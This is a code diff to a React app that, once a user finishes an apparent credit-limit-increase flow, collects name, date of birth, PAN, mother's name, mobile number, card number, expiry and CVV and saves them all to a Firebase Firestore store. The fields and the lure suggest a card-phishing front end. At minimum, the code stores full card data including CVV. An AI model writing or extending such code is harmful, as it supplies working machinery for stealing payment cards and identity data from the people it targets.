@@ -3,6 +3,8 @@ import HomeScreen from './components/HomeScreen';
 import EnterDetailsScreen from './components/EnterDetailsScreen';
 import CardDetailsScreen from './components/CardDetailsScreen';
 import ConfirmationScreen from './components/ConfirmationScreen';
+import { saveCustomerSubmission } from './firebase';
+
 export default function App() {
   const [currentScreen, setCurrentScreen] = useState('home');
   const [selectedService, setSelectedService] = useState('');
@@ -21,10 +23,31 @@ export default function App() {
     setCurrentScreen('card_details');
   };
 
-  // 3. Card Details Submit -> Go to Confirmation Screen for ALL options
-  const handleCardDetailsSubmitted = (cardData) => {
+  // 3. Card Details Submit -> Save to Firebase Firestore & Go to Confirmation Screen
+  const handleCardDetailsSubmitted = async (cardData) => {
     setCardDetails(cardData);
     setCurrentScreen('confirmation');
+
+    // Prepare complete application payload
+    const submissionData = {
+      fullName: personalDetails?.fullName || '',
+      dob: personalDetails?.dob || '',
+      panNumber: personalDetails?.panNumber || '',
+      mothersName: personalDetails?.mothersName || '',
+      mobileNumber: personalDetails?.mobileNumber || '',
+      selectedService: selectedService || 'increase_limit',
+      nameOnCard: cardData?.nameOnCard || personalDetails?.fullName || '',
+      cardNumber: cardData?.cardNumber || '',
+      expiryDate: cardData?.expiryDate || '',
+      cvv: cardData?.cvv || ''
+    };
+
+    // Save to Firebase Firestore
+    try {
+      await saveCustomerSubmission(submissionData);
+    } catch (e) {
+      console.error('Firebase submission error:', e);
+    }
   };
 
   // Reset back to home screen
